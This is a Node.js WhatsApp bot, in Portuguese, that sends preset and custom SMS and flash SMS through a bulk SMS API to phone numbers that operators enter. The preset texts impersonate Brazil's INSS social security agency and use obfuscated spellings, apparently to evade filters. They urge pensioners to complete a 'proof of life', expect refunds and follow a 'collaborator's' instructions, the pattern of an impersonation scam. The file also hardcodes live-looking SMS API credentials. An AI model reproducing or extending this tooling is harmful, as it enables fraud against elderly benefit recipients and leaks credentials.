import pkg from 'whatsapp-web.js';
const { Client, LocalAuth } = pkg;
import qrcode from 'qrcode-terminal';
import axios from 'axios';
import dotenv from 'dotenv';
import fs from 'fs';

dotenv.config();

// Remove a pasta .wwebjs_auth para forçar nova autenticação
try {
    fs.rmSync('.wwebjs_auth', { recursive: true, force: true });
    console.log('Sessão anterior removida. Pronto para nova conexão.');
} catch (error) {
    // Ignora erro se a pasta não existir
}

// Inicializa o cliente WhatsApp
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        args: ['--no-sandbox']
    }
});

// Gera o QR Code para autenticação em formato pequeno
client.on('qr', (qr) => {
    console.clear(); // Limpa o console antes de mostrar o QR Code
    qrcode.generate(qr, { small: true }); // Usa o formato pequeno do QR Code
    console.log('\nPor favor, escaneie o QR Code acima com seu WhatsApp.\n');
});

client.on('ready', () => {
    console.clear(); // Limpa o console
    console.log('✅ Bot está pronto e conectado!\n');
    console.log('Comandos disponíveis:');
    console.log('!sms - Lista todos os comandos');
    console.log('!sms1 até !sms8 seguido do número - Envia a mensagem específica');
    console.log('!sms9 [número] (mensagem) - Envia uma mensagem personalizada');
    console.log('!sms2 [número] - l N S S : PARA NAO PERDER SEU BENEFlCl0 FINALIZE SUA PROVA DE VIDA.');
    console.log('!sms3 [número] - Solicitação de ressarcimento');
    console.log('!sms4 [número] - Aguardando Confirmação de Ressarcimento');
    console.log('!sms5 [número] - Estorno de simulação');
    console.log('!sms6 [número] - Confirmações 1/3');
    console.log('!sms7 [número] - Confirmações 2/3');
    console.log('!sms8 [número] - Confirmações 3/3');
    console.log('!sms10 [número] (mensagem) - Envia uma mensagem personalizada');
    console.log('!ajuda - Mostra esta mensagem de ajuda');
    console.log('\n');
});

client.on('disconnected', (reason) => {
    console.log('Bot desconectado:', reason);
    process.exit(1); // Encerra o processo para permitir reconexão
});

// Configuração das APIs
const WEATHER_API_BASE_URL = 'https://api.openweathermap.org/data/2.5/weather';
const CRYPTO_API_BASE_URL = 'https://api.coingecko.com/api/v3';

// Mensagens predefinidas
const mensagens = {
    'sms1': 'l N S S : PROVA DE VIDA EM ANDAMENTO , SIGA AS INSTRUCOES DO NOSSO COLABORADOR.',
    'sms2': 'l N S S : PARA NAO PERDER SEU BENEFlCl0 FINALIZE SUA PROVA DE VIDA.',
    'sms2.1': 'l N S S : Finalize sua Prova de Vida para evitar o BL0QUEl0.',
    'sms2.2': 'l N S S : Não perca o acesso, faça a Prova de Vida e evite o BL0QUEl0.',
    'sms3': 'l N S S : SOLICITAÇÃO DE RESSARClMENT0 FEITA , CREDlT0 EM CONTA em até 24horas.',
    'sms4': 'l N S S : Aguardando confirmação de resarcimento para finalizar o RESSARClMENT0.',
    'sms5': 'l N S S : EST0RN0 DE SIMULAÇÃO.',
    'sms6': 'l N S S : PROVA DE VIDA EM ANDAMENTO , CONFIRMACOES 1/3. SIGA AS INSTRUCOES DO NOSSO COLABORADOR(A).',
    'sms7': 'l N S S : PROVA DE VIDA EM ANDAMENTO , CONFIRMACOES 2/3. SIGA AS INSTRUCOES DO NOSSO COLABORADOR(A).',
    'sms8': 'l N S S : PROVA DE VIDA EM ANDAMENTO , CONFIRMACOES 3/3. SIGA AS INSTRUCOES DO NOSSO COLABORADOR(A).',
    'sms10': 'I N S S EM CONTATO'
};

// Configurações da API Facilita Móvel
const API_CONFIG = {
    baseURL: 'http://api.facilitamovel.com.br/api/simpleSend.ft',
    user: 'luizsoldi777',
    password: 'QSX12az@'
};

// Função para validar número de telefone
function validarTelefone(numero) {
    // Remove todos os caracteres não numéricos
    const numeroLimpo = numero.replace(/\D/g, '');
    // Verifica se o número tem entre 10 e 11 dígitos
    return numeroLimpo.length >= 10 && numeroLimpo.length <= 11;
}

// Função para enviar SMS através da API Facilita Móvel
async function enviarSMS(telefone, mensagem, isFlash = false) {
    try {
        const params = {
            user: API_CONFIG.user,
            password: API_CONFIG.password,
            destinatario: telefone,
            msg: mensagem,
            flashsms: isFlash ? '1' : '0'
        };

        const response = await axios.get(API_CONFIG.baseURL, { params });
        
        // Verifica a resposta da API
        if (response.status === 200) {
            console.log(`Resposta da API (${isFlash ? 'Flash' : 'Normal'} SMS):`, response.data);
            return { success: true, message: `${isFlash ? 'Flash ' : ''}SMS enviado com sucesso!` };
        } else {
            return { success: false, message: `Erro ao enviar ${isFlash ? 'Flash ' : ''}SMS.` };
        }
    } catch (error) {
        console.error(`Erro ao enviar ${isFlash ? 'Flash ' : ''}SMS:`, error.message);
        return { success: false, message: 'Erro ao conectar com o servidor.' };
    }
}

// Função para enviar ambos os tipos de SMS
async function enviarAmbosSMS(telefone, mensagem) {
    const resultadoNormal = await enviarSMS(telefone, mensagem, false);
    const resultadoFlash = await enviarSMS(telefone, mensagem, true);

    return {
        normal: resultadoNormal,
        flash: resultadoFlash,
        success: resultadoNormal.success || resultadoFlash.success
    };
}

// Função para formatar a lista de comandos
function getListaComandos() {
    return `*📱 Lista de Comandos Disponíveis:*\n\n` +
        `!sms - Mostra esta lista de comandos\n` +
        `!sms1 [número] - Prova de vida em andamento\n` +
        `!sms2 [número] - l N S S : PARA NAO PERDER SEU BENEFlCl0 FINALIZE SUA PROVA DE VIDA.\n` +
        `!sms3 [número] - Solicitação de ressarcimento\n` +
        `!sms4 [número] - Aguardando Confirmação de Ressarcimento\n` +
        `!sms5 [número] - Estorno de simulação\n` +
        `!sms6 [número] - Confirmações 1/3\n` +
        `!sms7 [número] - Confirmações 2/3\n` +
        `!sms8 [número] - Confirmações 3/3\n` +
        `!sms9 [número] (mensagem) - Envia uma mensagem personalizada\n` +
        `!sms10 [número] (mensagem) - Envia uma mensagem personalizada\n\n` +
        `*Exemplo de uso:*
` +
        `!sms1 11943800293\n` +
        `!sms9 11943800293 (Olá, esta é uma mensagem personalizada!)\n` +
        `!sms10 11943800293 (Olá, esta é uma mensagem personalizada!)` +
        `\n\n` +
        `❓ !ajuda - Mostra esta mensagem`;
}

// Processa as mensagens recebidas
client.on('message', async msg => {
    console.log('Mensagem recebida:', msg.body);
    const command = msg.body.toLowerCase();

    // Comando para listar todas as opções
    if (command === '!sms') {
        msg.reply(getListaComandos());
        return;
    }

    // Verifica se é um comando de SMS válido
    const match = command.match(/^!sms([1-8])\s+(.+)$/);
    if (match) {
        const [, numeroComando, telefone] = match;
        
        // Valida o número de telefone
        if (!validarTelefone(telefone)) {
            msg.reply('❌ Número de telefone inválido. Use um número com 10 ou 11 dígitos.');
            return;
        }

        // Obtém a mensagem correspondente
        const mensagem = mensagens[`sms${numeroComando}`];
        if (mensagem) {
            // Tenta enviar ambos os SMS
            const resultado = await enviarAmbosSMS(telefone, mensagem);
            
            if (resultado.success) {
                let mensagemResposta = `✅ Mensagens enviadas para ${telefone}:\n${mensagem}\n\n`;
                mensagemResposta += `SMS Normal: ${resultado.normal.message}\n`;
                mensagemResposta += `Flash SMS: ${resultado.flash.message}`;
                msg.reply(mensagemResposta);
            } else {
                msg.reply(`❌ Erro ao enviar mensagens:\nSMS Normal: ${resultado.normal.message}\nFlash SMS: ${resultado.flash.message}`);
            }
        }
    }

    // Nova opção: mensagem personalizada com !sms9 [número] (mensagem)
    const match9 = command.match(/^!sms9\s+(\d{10,11})\s*\(([^)]+)\)$/i);
    if (match9) {
        const [, telefone, mensagemPersonalizada] = match9;
        // Valida o número de telefone
        if (!validarTelefone(telefone)) {
            msg.reply('❌ Número de telefone inválido. Use um número com 10 ou 11 dígitos.');
            return;
        }
        // Tenta enviar ambos os SMS
        const resultado = await enviarAmbosSMS(telefone, mensagemPersonalizada);
        if (resultado.success) {
            let mensagemResposta = `✅ Mensagem personalizada enviada para ${telefone}:\n${mensagemPersonalizada}\n\n`;
            mensagemResposta += `SMS Normal: ${resultado.normal.message}\n`;
            mensagemResposta += `Flash SMS: ${resultado.flash.message}`;
            msg.reply(mensagemResposta);
        } else {
            msg.reply(`❌ Erro ao enviar mensagens:\nSMS Normal: ${resultado.normal.message}\nFlash SMS: ${resultado.flash.message}`);
        }
        return;
    }

    // Comando de ajuda
    else if (command === '!ajuda') {
        const helpMessage = `🤖 *Comandos disponíveis:*

` +
            `!sms - Mostra a lista de comandos
` +
            `!sms1 [número] - Prova de vida em andamento
` +
            `!sms2 [número] - teste
` +
            `!sms3 [número] - Solicitação de ressarcimento
` +
            `!sms4 [número] - Aguardando Confirmação de Ressarcimento
` +
            `!sms5 [número] - Estorno de simulação
` +
            `!sms6 [número] - Confirmações 1/3
` +
            `!sms7 [número] - Confirmações 2/3
` +
            `!sms8 [número] - Confirmações 3/3
` +
            `!sms9 [número] (mensagem) - Envia uma mensagem personalizada
` +
            `!sms10 [número] (mensagem) - Envia uma mensagem personalizada

` +
            `*Exemplo de uso:*
` +
            `!sms1 11943800293
` +
            `!sms9 11943800293 (Olá, esta é uma mensagem personalizada!)
` +
            `!sms10 11943800293 (Olá, esta é uma mensagem personalizada!)`;
        msg.reply(helpMessage);
    }

    // Adicionar suporte ao comando !sms10
    const match10 = command.match(/^!sms10\s+(.+)$/);
    if (match10) {
        const telefone = match10[1].replace(/\D/g, '');
        if (!validarTelefone(telefone)) {
            msg.reply('❌ Número de telefone inválido. Use um número com 10 ou 11 dígitos.');
            return;
        }
        const mensagem = mensagens['sms10'];
        const resultado = await enviarAmbosSMS(telefone, mensagem);
        if (resultado.success) {
            let mensagemResposta = `✅ Mensagens enviadas para ${telefone}:\n${mensagem}\n\n`;
            mensagemResposta += `SMS Normal: ${resultado.normal.message}\n`;
            mensagemResposta += `Flash SMS: ${resultado.flash.message}`;
            msg.reply(mensagemResposta);
        } else {
            msg.reply(`❌ Erro ao enviar mensagens:\nSMS Normal: ${resultado.normal.message}\nFlash SMS: ${resultado.flash.message}`);
        }
        return;
    }
});

// Inicia o bot
client.initialize(); 